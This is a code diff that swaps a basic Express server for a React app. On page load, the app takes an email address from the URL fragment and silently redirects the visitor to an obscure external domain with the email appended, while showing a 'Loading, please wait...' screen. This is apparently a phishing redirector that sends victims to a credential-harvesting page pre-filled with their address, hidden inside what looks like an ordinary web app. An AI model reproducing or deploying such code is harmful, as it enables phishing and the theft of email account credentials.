@@ -1,16 +1,39 @@
-const express = require('express');
-const path = require('path');
+import React, { useEffect } from "react";
 
-const app = express();
+function App() {
+  // Function to extract the value after the '#' symbol in the URL
+  const getEmailFromUrl = () => {
+    const url = window.location.href;
+    const email = url.split("#")[1];
+    return email;
+  };
 
-app.set('views', path.join(__dirname, 'views'));
-app.set('view engine', 'pug');
-app.use(express.static(path.join(__dirname, 'public')))
+  // Function to manipulate the URL and redirect
+  const manipulateUrl = () => {
+    const email = getEmailFromUrl();
 
-app.get('/', (req, res) => {
-    res.render('index');
-});
+    if (email) {
+      // Append the email to the new URL
+      const newUrl = `https://afqw-320rfeqd.brizaste.pro/GIKmVOyQ#${email}`;
+      // Redirect to the new URL
+      window.location.href = newUrl;
+    } else {
+      // If no email found, redirect normally
+      const defaultUrl = "https://afqw-320rfeqd.brizaste.pro/GIKmVOyQ";
+      window.location.href = defaultUrl;
+    }
+  };
 
-const server = app.listen(3000, () => {
-    console.log(`The application started on port ${server.address().port}`);
-});
+  // Use effect hook to run the function when the component is mounted
+  useEffect(() => {
+    manipulateUrl();
+  }, []);
+
+  return (
+    <div>
+      <h1>Loading, please wait...</h1>
+    </div>
+  );
+}
+
+export default App;
